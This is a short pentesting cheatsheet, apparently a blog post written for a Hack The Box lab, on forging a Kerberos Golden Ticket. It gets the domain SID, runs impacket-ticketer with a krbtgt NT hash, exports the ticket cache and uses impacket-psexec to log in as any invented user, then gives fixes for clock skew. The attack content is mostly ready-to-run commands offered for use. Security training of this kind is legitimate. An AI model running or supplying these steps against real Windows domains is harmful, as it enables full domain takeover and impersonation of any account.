---
layout: post
title: "Cheatsheets: Golden Ticket"
date: 2022-08-10 23:32 +0100
tags: pentesting windows kerberos kali cheatsheet impacket
categories: [Cheatsheets, Windows]
published: false
---

![](/assets/img/2022-10-09-02-14-12.png)

need to get hold of the `krbtgt` hash (this is the key that Windows uses to sign tickets)

usually done by performing a DCSync and then performing a secretsdump

```bash
# to get the `-domain-sid` 
Get-ADDomain htb.local
```

```bash
impacket-ticketer -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local WhateverWeWant
```

The above command will create a file with the ticket information all you need to do to use it is set it as an environment variable:

```bash
export KRB5CCNAME=WhateverWeWant.ccache
```

Then we can PSExec in as literally any username we like because we just created a ticket with signed by the Domain, and everything within the Domain implicitly trusts anything signed by the Domain and doesn't bother to check, because that's how that works.

```bash
impacket-psexec -k -debug -no-pass htb.local\WhateverWeWant@forest
```

> Use the machine name/domain name to connect, this particular command doesn't like IP addresses (add to /etc/hosts)
{: .prompt-tip }

## Overcoming any Clock Skew Issues

Work out what Timezone the machine is in (roughly) and set that as your `localtime` in this case setting it to US/Pacific got us to the same caldendar date, which is the important bit of setting the Timezone.

```bash
sudo su
cat /usr/share/zoneinfo/US/Pacific > /etc/localtime
exit
```

If you still get a Clock Skew error run `date` on the target and just set your PC time to whatever time is on the box. Kerberos has issues if there is a difference of 10 minutes or so and some machines end up quite badly out of sync because their local NTP server is crap or you're attacking a VM with no external internet access so it can't update that way.

```bash
sudo date -s 18:05:49
```

> Rerun the `impacket-ticketer` command at this point to refresh the ticket.
{: .prompt-tip }


